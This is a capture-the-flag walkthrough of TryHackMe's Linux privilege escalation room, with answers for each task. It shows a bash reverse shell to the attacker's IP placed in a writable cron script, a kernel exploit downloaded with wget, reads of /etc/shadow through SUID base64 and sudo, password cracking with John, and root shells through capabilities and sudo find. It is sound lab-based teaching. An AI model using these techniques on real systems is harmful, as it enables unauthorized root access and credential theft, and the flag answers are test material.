![Linux Privilege Escalation Banner](https://assets.tryhackme.com/room-banners/privesc.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cover.png" alt="Linux Privilege Escalation Logo">
</p>

# Linux Privilege Escalation

This guide contains the answer and steps necessary to get to them for the [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc) room.

## Table of contents

- [Enumeration](#enumeration)
- [Automated Enumeration Tools](#automated-enumeration-tools)
- [Privilege Escalation: Kernel Exploits](#privilege-escalation-kernel-exploits)
- [Privilege Escalation: Sudo](#privilege-escalation-sudo)
- [Privilege Escalation: SUID](#privilege-escalation-suid)
- [Privilege Escalation: Capabilities](#privilege-escalation-capabilities)
- [Privilege Escalation: Cron Jobs](#privilege-escalation-cron-jobs)
- [Privilege Escalation: PATH](#privilege-escalation-path)
- [Privilege Escalation: NFS](#privilege-escalation-nfs)
- [Capstone Challenge](#capstone-challenge)

### Enumeration

1. What is the hostname of the target system?

   ><details><summary>Click for answer</summary>wade7363</details>
   
2. What is the Linux kernel version of the target system?

   ><details><summary>Click for answer</summary>3.13.0-24-generic</details>

3. What Linux is this?

   ><details><summary>Click for answer</summary>Ubuntu 14.04 LTS</details>

4. What version of the Python language is installed on the system?

   ><details><summary>Click for answer</summary>2.7.6</details>

5. What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

   ><details><summary>Click for answer</summary>CVE-2015-1328</details>

### Automated Enumeration Tools

### Privilege Escalation: Kernel Exploits

1. Find and use the appropriate kernel exploit to gain root privileges on the target system.

   We first need to find the kernel version on this system with `uname -a`.

   ![Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Kernel_Version.png)

   Then we can look for an exploit for this kernel through Exploit Database for example.

   ![Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Kernel_Exploit.png)

   Now we can either download the file from here or locate it on our machine through the file name. 

3. What is the content of the flag1.txt file?

   I will first  rename the file to exploit.c.

   ```cmd
   mv 37292.c exploit.c
   ```

   Then we set up a web server on our machine to deliver the file.

   ```cmd
   python3 -m http.server 8080
   ```

   In the temp folder we can download the exploit.

   ```cmd
   wget 10.18.78.136:8080/exploit.c
   ```

   ![Prepare](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Kernel_Prepare.png)
   
   Now we should compile the file.

   ```cmd
   gcc exploit.c -o exploit
   ```

   ![Success](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Kernel_Success.png)

   Lastly, we need to search for the flag and read it!
   
   ```cmd
   find / -name flag1.txt 2>/dev/null

   cat /home/matt/flag1.txt
   ```

   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Kernel_Flag.png)
   
   ><details><summary>Click for answer</summary>THM-28392872729920</details>
   
### Privilege Escalation: Sudo

1. How many programs can the user "karen" run on the target system with sudo rights?

   We can find that out with: `sudo -l`.

   ![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Sudo_Permissions.png)

   ><details><summary>Click for answer</summary>3</details>

3. What is the content of the flag2.txt file?

   We first locate the flag with:

   ```cmd
   find / -name flag2.txt 2>/dev/null
   ```

   ![Location](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Sudo_Location.png)

   To read the flag we can use either `less` or `nano`.

   ```cmd
   sudo less /home/ubuntu/flag2.txt

   sudo nano /home/ubuntu/flag2.txt
   ```

   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Sudo_Flag.png)

   P.s. It turned out permission weren't even needed to read the flag..

   ><details><summary>Click for answer</summary>THM-402028394</details>

5. How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

   This can be found on the GTFOBins website whilst searching for nmap.

   ><details><summary>Click for answer</summary>sudo nmap --interactive</details>

6. What is the hash of frank's password?

   To do this we exploit the nmap sudo permissions to read the shadow file.

   ```cmd
   sudo nano /etc/shadow
   ```

   ![Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Sudo_Hashes.png)

   ><details><summary>Click for answer</summary>$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</details>

### Privilege Escalation: SUID

1. Which user shares the name of a great comic book writer?

   This we can find in the passwd file. This can be opened without any permissions. So we can use any means we want.

   ![Writer](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Suid_Writer.png)

   Copy to contents to a file.

   ><details><summary>Click for answer</summary>gerryconway</details>

3. What is the password of user2?

   First we need to find which binary with a set SUID bit we can use.

   ```cmd
   find / -type f -perm -4000 2>/dev/null
   ```

   ![Bin](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Suid_Bin.png)

   Looks like we can use base64. Let's us it to copy the contents of the shadow file.

   ```cmd
   /usr/bin/base64 "/etc/shadow" | base64 --decode
   ```

   ![Shadow](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Suid_Shadow.png)

   Now we join these two files with `unshadow`.

   ```cmd
   unshadow passwd.txt shadow.txt > passwords.txt
   ```

   Finally, we use john to crack the password.

   ```cmd
   john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt 
   ```

   ![Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Suid_Passwords.png)

   ><details><summary>Click for answer</summary>Password1</details>

5. What is the content of the flag3.txt file?

   We can use the same method as before, but with a different file. Searching for the flag gives us its location.

   ```cmd
   find / -name flag3.txt 2>/dev/null
   /home/ubuntu/flag3.txt
   ```

   ```cmd
   /usr/bin/base64 "/home/ubuntu/flag3.txt" | base64 --decode
   ```

   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Suid_Flag.png)

   ><details><summary>Click for answer</summary>THM-3847834</details>

### Privilege Escalation: Capabilities

1. How many binaries have set capabilities?

   Using `getcap -r` we can see which binaries have capabilities set.
   
   ```cmd
   getcap -r / 2>/dev/null
   ```

   CAPABILITIES SET

   ><details><summary>Click for answer</summary>6</details>

1. What other binary can be used through its capabilities?

   Comparing our previous binary list on GTFObins should give us the answer.
   
   ![Set](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capabilities_Set.png)

   ><details><summary>Click for answer</summary>view</details>

3. What is the content of the flag4.txt file?

   First we look for the flag using:

   ```cmd
   find /home -name flag4.txt 2>/dev/null
   ```

   Apparently, we can read the file without root access.

   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capabilities_Flag.png)

   Lets try the escalation our privileges anyway using the view binary. For this to work we need to use the path we identified in the first image. Then use the following command:

   ```cmd
   /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
   ```

   This gives us a root shell that we can leverage.

   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capabilities_Root.png)

   ><details><summary>Click for answer</summary>THM-9349843</details>

### Privilege Escalation: Cron Jobs

1. How many user-defined cron jobs can you see on the target system?

   Using the following command we can list all existing cronjobs:

   ```cmd
   cat /etc/crontab
   ```

   ![Tab](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cron_Tab.png)

   ><details><summary>Click for answer</summary>4</details>

2. What is the content of the flag5.txt file?

   We have found a script we can alter (backup.sh). Lets add a simple tcp reverse shell using bash taken from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp).

   ```cmd
   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
   ```

   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cron_Script.png)

   As the shell didn't work at first, I had to check its permissions with `ls -lh`. This showed the file wasn't executale.

   ![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cron_Permissions.png)

   Using `chmod +x backup.sh` would fix this.

   Now we set up a listener on our machine and wait.

   ```cmd
   nc -nlvp 1337
   ```

   Once the connection is made, we can look for the flag.

   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cron_Flag.png)

   ><details><summary>Click for answer</summary>THM-383000283</details>

4. What is Matt's password?

   To do this we need his password hash. This can be done by viewing the shadow file.

   ```cmd
   cat /etc/shadow | grep "matt"
   ```

   ![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cron_Hash.png)

   Now we can plug this into John the Ripper to crack the password itself (using `sha512crypt` as the format).

   ```cmd
   john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt  matpass.hash
   ```

   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Cron_Password.png)

   ><details><summary>Click for answer</summary>123456</details>

### Privilege Escalation: PATH

1. What is the odd folder you have write access for?

   To find all writable folder we can use the following command. We will also look for subfolders, as that is shown in the answer.

   ```cmd
   find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
   ```

   ><details><summary>Click for answer</summary>/home/murdoch</details>

Exploit the $PATH vulnerability to read the content of the flag6.txt file.

3. What is the content of the flag6.txt file?

   Lets check were the flag files i located.

   ```cmd
   find / -name flag6* 2>/dev/null
   ```

   `/home/matt/flag6.txt`.
   
   We found the test file to be present in the home folder of Murdoch. so we need to add it to the PATH variable. As well as creating a thm file with a command to read the flag.

   ```cmd
   export PATH=/home/murdoch:$PATH
   
   echo "cat /home/matt/flag6.txt" > thm
   ```

   ![Path Prep](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Path_Prep.png)

   Now we must make the file executable and run the test file.

   ```cmd
   chmod +x thm

   ./test
   ```

   ![Path Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Path_Flag.png)

   ><details><summary>Click for answer</summary>THM-736628929</details>

### Privilege Escalation: NFS

1. How many mountable shares can you identify on the target system?

   ```cmd
   showmount -e 10.10.6.120 
   ```

   ![NFS Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_NFS_Shares.png)

   ><details><summary>Click for answer</summary>3</details>

2. How many shares have the "no_root_squash" option enabled?

   ```cmd
   cat /etc/exports
   ```

   ![NFS Squash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_NFS_Squash.png)

   ><details><summary>Click for answer</summary>3</details>

Gain a root shell on the target system

4. What is the content of the flag7.txt file?

   For this we will mount the `/tmp` folder to our system and add a binary that will give us root access.

   ```cmd
   mkdir /tmp/sharedtmpfolder
   mount -o rw 10.10.253.205:/tmp /tmp/sharedtmpfolder

   vi nfs.c
   chmod +x
   gcc nfs.c -o nfs -w
   ```

   ![NFS Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_NFS_Script.png)

   Unfortunately, I would get errors messages when trying to compile to file. In the end this just didn't seem to work on my system.

   ><details><summary>Click for answer</summary></details>

### Capstone Challenge

1. What is the content of the flag1.txt file?

   First thing to do is to locate the flags. Unfortunately, the search didn't reveal anything. Probably, because our account is not allowed to look into other users folders.

   ```cmd
   find / -name flag* 2>/dev/null
   ```

   After enumerating multiple entry vectors, the SUID method seems to work. Using the following command we see we can abuse `base64` to read files we aren't allowed to.

   ```cmd
   find / -type f -perm -4000 2>/dev/null
   ```

   ![Suid](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Suid.png)

   Using GTFOBins, we can see how we can read such files.

   ![Suid Gtfo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Suid_Gtfo.png)

   Unfortunately, we don't know the location of the flags yet, but we can try and read the shadow file.
   
   ```cmd
   /usr/bin/base64 "/etc/shadow" | base64 --decode
   ```

   ![Shadow](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Shadow.png)

   Cracking missy's hash with John gives us her password (unfortunately we couldn't crack roots password).

   ```cmd
   john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt  missyhash.hash

   Results -> Password1
   ```

   After switching the missy's account using `su missy` we can look for any of the flags again. Looks like there is one located at `/home/missy/Documents/flag1.txt`.

   This flag we can actually read now.

   ![Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag1.png)

   ><details><summary>Click for answer</summary>THM-42828719920544</details>

3. What is the content of the flag2.txt file?

   The second flag is probably located in `/home/rootflag`, so we will probably need root access for this one.

   After searching for a long time, I couldn't find anything. But then I re-checked missy to see if she could run anything with sudo.

   ```cmd
   sudo -l
   ```

   Apparently, she can use `find` with sudo. We can use the following command to find the second flag:

   ```cmd
   sudo find /home -name flag* 2>/dev/null
   ```

   ![Flag Location](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag_Location.png)

   We can now either use the same `base64` exploit to read the flag or we can escalate our privileges to root with the find binary.

   ```cmd
   /usr/bin/base64 "/home/rootflag/flag2.txt" | base64 --decode
   ```

   ![Flag2 Base](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag2_Base.png)

   Or

   ```cmd
   sudo find . -exec /bin/sh \; -quit

   cat /home/rootflag/flag2.txt
   ```

   ![Flag2 Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linprivesc/Linux_Privilege_Escalation_Capstone_Flag2_Root.png)

   ><details><summary>Click for answer</summary>THM-168824782390238</details>
